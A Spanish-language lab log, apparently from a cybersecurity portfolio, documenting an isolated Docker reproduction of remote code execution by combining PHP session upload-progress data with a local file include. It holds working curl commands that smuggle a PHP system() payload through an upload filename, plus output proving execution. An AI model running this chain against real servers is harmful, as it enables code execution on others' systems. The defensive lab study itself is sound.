# Comandos ejecutados — 11 / escritura en la sesión y ejecución por inclusión

> Evidencia: `2026-11-02-11-upload-progress-include`
>
> Fecha: 2026-11-02.
>
> Rutas locales sustituidas por `~`. Sin secretos, sin IPs internas y sin datos de terceros.
>
> El proyecto de Docker se llamaba `php2shell` cuando se capturaron los artefactos; de ahí los nombres `php2shell-web-1` y `php2shell-gate-1`. El directorio se renombró después para no llamar PHP2Shell a una cadena que no lo es.

## 1. Preparación

```bash
cd ~/Repositorios/portfolio-ciberseguridad-lorenzo/11-hacking-etico-api/lab/upload-progress-include
docker compose up -d
sleep 3
```

`docker-compose.yml` levanta dos servicios: `web` con `php:8.2.34-apache` en una red interna, y `gate` con `alpine/socat:1.8.0.3` entre esa red y el equipo, publicando solo `127.0.0.1:8088`.

## 2. Entorno y aislamiento

```bash
{
  date -Is
  uname -srm
  docker --version
  docker compose ps
  docker compose exec -T web php -v
  ss -ltn | grep 8088
  echo '# salida a Internet'
  docker compose exec -T web php -r 'echo @fsockopen("1.1.1.1",443,$e,$s,3) ? "SALE\n" : "sin salida\n";'
  docker compose exec -T web php -r 'echo gethostbyname("example.com")==="example.com" ? "sin DNS externo\n" : "resuelve\n";'
} > artefactos/entorno.txt
```

Salida (completa en [`artefactos/entorno.txt`](artefactos/entorno.txt)):

```text
2026-11-02T12:18:54+01:00
Linux 7.0.0-38-generic x86_64
Docker version 29.1.3, build 29.1.3-0ubuntu4.1
NAME               IMAGE                  COMMAND                  SERVICE   CREATED         STATUS         PORTS
php2shell-gate-1   alpine/socat:1.8.0.3   "socat TCP-LISTEN:80…"   gate      5 minutes ago   Up 5 minutes   127.0.0.1:8088->8080/tcp
php2shell-web-1    php:8.2.34-apache      "docker-php-entrypoi…"   web       5 minutes ago   Up 5 minutes   80/tcp
PHP 8.2.34 (cli) (built: Oct 21 2026 00:35:21) (NTS)
LISTEN 0      4096       127.0.0.1:8088       0.0.0.0:*
# salida a Internet
sin salida
sin DNS externo
```

Lectura: la web responde solo en loopback, no alcanza `1.1.1.1:443` y no resuelve nombres externos. El puerto `80/tcp` de `web` es interno; no está publicado al equipo.

## 3. Cadena completa

```bash
{
  echo '# sesion creada por el cliente'
  docker compose exec -T web ls -l /tmp/sess_prueba123
  echo '# subida colgada y nota en la sesion'
  curl -sS --limit-rate 8k -b 'PHPSESSID=prueba123' \
    -F 'PHP_SESSION_UPLOAD_PROGRESS=pwn' \
    -F "file=@/tmp/big.bin;filename=<?php system('id')?>.txt" \
    http://127.0.0.1:8088/ >/dev/null 2>&1 &
  pid=$!
  sleep 3
  docker compose exec -T web cat /tmp/sess_prueba123
  echo
  echo '# ejecucion mediante include'
  curl -sS -b 'PHPSESSID=prueba123' \
    'http://127.0.0.1:8088/?page=/tmp/sess_prueba123' | grep -o 'uid=[^<]*'
  kill $pid 2>/dev/null
  wait $pid 2>/dev/null
} > artefactos/cadena.txt
```

Salida (completa en [`artefactos/cadena.txt`](artefactos/cadena.txt)):

```text
# sesion creada por el cliente
-rw------- 1 www-data www-data 0 Nov  2 11:17 /tmp/sess_prueba123
# subida colgada y nota en la sesion
upload_progress_pwn|a:5:{s:10:"start_time";i:1793618335;s:14:"content_length";i:400339;s:15:"bytes_processed";i:25881;s:4:"done";b:0;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:24:"<?php system('id')?>.txt";s:8:"tmp_name";N;s:5:"error";i:0;s:4:"done";b:0;s:10:"start_time";i:1793618335;s:15:"bytes_p...
# ejecucion mediante include
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El fichero de sesión mide 0 bytes antes de la subida y contiene la nota de progreso después. El nombre del archivo, elegido por el cliente, queda dentro de una cadena de esa estructura; `include` la ejecuta aunque esté rodeada de comillas y texto.

## 4. Control sobre la versión parcheada

```bash
sed -i 's|php:8.2.34-apache|php:8.2.35-apache|' docker-compose.yml
docker compose down
docker compose up -d
sleep 8

{
  echo '# control: misma cadena con la version que corrige PHP2Shell'
  docker compose exec -T web php -v | head -1
  echo '# subida colgada y nota en la sesion'
  curl -sS --limit-rate 8k -b 'PHPSESSID=parcheado1' \
    -F 'PHP_SESSION_UPLOAD_PROGRESS=pwn' \
    -F "file=@/tmp/big.bin;filename=<?php system('id')?>.txt" \
    http://127.0.0.1:8088/ >/dev/null 2>&1 &
  pid=$!
  sleep 3
  docker compose exec -T web cat /tmp/sess_parcheado1
  echo
  echo '# ejecucion mediante include'
  curl -sS -b 'PHPSESSID=parcheado1' \
    'http://127.0.0.1:8088/?page=/tmp/sess_parcheado1' | grep -o 'uid=[^<]*'
  kill $pid 2>/dev/null
  wait $pid 2>/dev/null
} > artefactos/control-8.2.35.txt
```

Salida (completa en [`artefactos/control-8.2.35.txt`](artefactos/control-8.2.35.txt)):

```text
# control: misma cadena con la version que corrige PHP2Shell
PHP 8.2.35 (cli) (built: Oct 28 2026 01:29:54) (NTS)
# subida colgada y nota en la sesion
upload_progress_pwn|a:5:{...s:4:"name";s:24:"<?php system('id')?>.txt";...}
# ejecucion mediante include
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

La cadena se repite íntegra sobre la versión que corrige PHP2Shell: el fallo no está en el motor de PHP.

## 5. Restauración

```bash
sed -i 's|php:8.2.35-apache|php:8.2.34-apache|' docker-compose.yml
docker compose down
rm -f /tmp/big.bin
```

## 6. Incidencias de herramienta

El primer intento con `curl` falló porque el nombre viaja en una cabecera del formulario:

- Las comillas dobles se codificaron como `%22`, y el código quedó como `echo%22MARCA%22`, que no es PHP válido.
- El punto y coma antes de `?>` se interpretó como separador de opciones de `-F`, y el cierre desapareció.

La variante que funciona usa comillas simples y prescinde del `;`, porque `?>` ya cierra la instrucción.
